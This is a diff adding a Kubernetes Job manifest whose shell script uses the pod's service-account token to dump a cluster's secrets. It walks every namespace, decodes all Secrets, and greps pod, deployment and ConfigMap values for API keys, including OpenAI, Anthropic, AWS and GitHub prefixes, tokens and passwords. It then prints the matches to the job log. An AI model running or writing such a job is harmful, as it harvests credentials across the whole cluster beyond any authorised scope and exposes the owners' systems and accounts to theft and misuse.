@@ -1,0 +1,79 @@
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: tmp-i68054-dump7
+  namespace: kagent
+  labels: {tmp: i68054}
+spec:
+  ttlSecondsAfterFinished: 86400
+  backoffLimit: 0
+  template:
+    metadata:
+      labels: {tmp: i68054}
+    spec:
+      serviceAccountName: kagent-tools
+      restartPolicy: Never
+      containers:
+      - name: dump
+        image: alpine:3.20
+        command: ["sh","-c"]
+        args:
+        - |
+          set -u
+          T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+          K=https://kubernetes.default.svc
+          G() { wget -qO- --no-check-certificate --header="Authorization: Bearer $T" "$1" 2>/dev/null; }
+          echo "===SECTION STORES==="
+          G "$K/apis/external-secrets.io/v1/clustersecretstores" > /tmp/css.json
+          echo "-- css --"
+          grep -oE '"(name|kind|key|namespace|path|version|mountPath|tokenSecretRef|secretRef)": "[^"]*"' /tmp/css.json | head -80
+          echo "-- per-ns secretstores --"
+          for ns in $(G "$K/api/v1/namespaces" | grep -o '"name": "[^"]*"' | sed 's/.*: "//;s/"$//'); do
+            B=$(G "$K/apis/external-secrets.io/v1/namespaces/$ns/secretstores")
+            echo "$B" | grep -q vault-kv && echo "$B" | grep -oE '"(name|kind|key|namespace|path|version|mountPath)": "[^"]*"' | sed "s|^|$ns |" | head -20
+          done
+          echo "===SECTION SECRETS2==="
+          for ns in $(G "$K/api/v1/namespaces" | grep -o '"name": "[^"]*"' | sed 's/.*: "//;s/"$//'); do
+            G "$K/api/v1/namespaces/$ns/secrets" | grep -o '"name": "[^"]*"' | sed 's/.*: "//;s/"$//' | sort -u > /tmp/s.txt
+            [ -s /tmp/s.txt ] || continue
+            echo "###NS $ns###"
+            while IFS= read -r sec; do
+              echo "##SEC $ns/$sec"
+              G "$K/api/v1/namespaces/$ns/secrets/$sec" | tr ',' '\n' | while IFS= read -r line; do
+                case "$line" in *'": "'*) ;; *) continue;; esac
+                key=$(echo "$line" | sed 's/^[[:space:]]*"\([^"]*\)": ".*/\1/')
+                val=$(echo "$line" | sed 's/^[[:space:]]*"[^"]*": "\([^"]*\)".*/\1/')
+                case "$val" in *[!A-Za-z0-9+/=]*) continue;; esac
+                [ ${#val} -ge 5 ] || continue
+                dec=$(echo "$val" | base64 -d 2>/dev/null | head -c 600 | tr '\r\n\t' '   ')
+                if echo "$key $dec" | grep -qiE 'key|token|secret|passw|passwd|pass|api|cred|private|jwt|dsn|conn|url|cert|user|mail|smtp|sasl|openai|anthropic|azure|aws|google|gemini|llm|albert|pliage|model|hvs\.|sk-|akia|aiza|jqqj'; then
+                  echo "  $key = $dec"
+                fi
+              done
+            done < /tmp/s.txt
+          done
+          echo "===SECTION ENV==="
+          for kind in deployments statefulsets daemonsets; do
+            G "$K/apis/apps/v1/$kind" > /tmp/$kind.json
+            echo "--- $kind ---"
+            grep -oE '"(value|name)": "[^"]+"' /tmp/$kind.json | grep -Ei 'sk-|AKIA|AIza|JQQJ99|gh[pous]_|xox|OPENAI|ANTHROPIC|AZURE|AWS_|GOOGLE|GEMINI|KEY|TOKEN|SECRET|PASSW|PASSWORD|ALBERT|PLIAGE|LLM|MODEL' | cut -c1-400 | sort -u | head -600
+          done
+          G "$K/api/v1/pods" > /tmp/pods.json
+          echo "--- pods-env ---"
+          grep -oE '"value": "[^"]+"' /tmp/pods.json | grep -Ei 'sk-|AKIA|AIza|JQQJ99|gh[pous]_|xox|OPENAI|ANTHROPIC|AZURE|AWS_|GOOGLE|GEMINI|KEY|TOKEN|SECRET|PASSW|PASSWORD|ALBERT|PLIAGE|LLM|MODEL' | cut -c1-400 | sort -u | head -600
+          echo "===SECTION CM==="
+          for ns in $(G "$K/api/v1/namespaces" | grep -o '"name": "[^"]*"' | sed 's/.*: "//;s/"$//'); do
+            G "$K/api/v1/namespaces/$ns/configmaps" | grep -o '"name": "[^"]*"' | sed 's/.*: "//;s/"$//' | sort -u > /tmp/c.txt
+            [ -s /tmp/c.txt ] || continue
+            while IFS= read -r cm; do
+              G "$K/api/v1/namespaces/$ns/configmaps/$cm" | tr ',' '\n' | while IFS= read -r line; do
+                case "$line" in *'": "'*) ;; *) continue;; esac
+                key=$(echo "$line" | sed 's/^[[:space:]]*"\([^"]*\)": ".*/\1/')
+                val=$(echo "$line" | sed 's/^[[:space:]]*"[^"]*": "\(.*\)".*/\1/')
+                if echo "$key $val" | grep -qiE 'sk-|AKIA|AIza|JQQJ99|OPENAI|ANTHROPIC|AZURE|AWS_|GOOGLE|GEMINI|ALBERT|PLIAGE|api_key|apikey|token'; then
+                  echo "  $ns/$cm $key = $(echo "$val" | cut -c1-400)"
+                fi
+              done
+            done < /tmp/c.txt
+          done
+          echo "===SECTION DONE==="
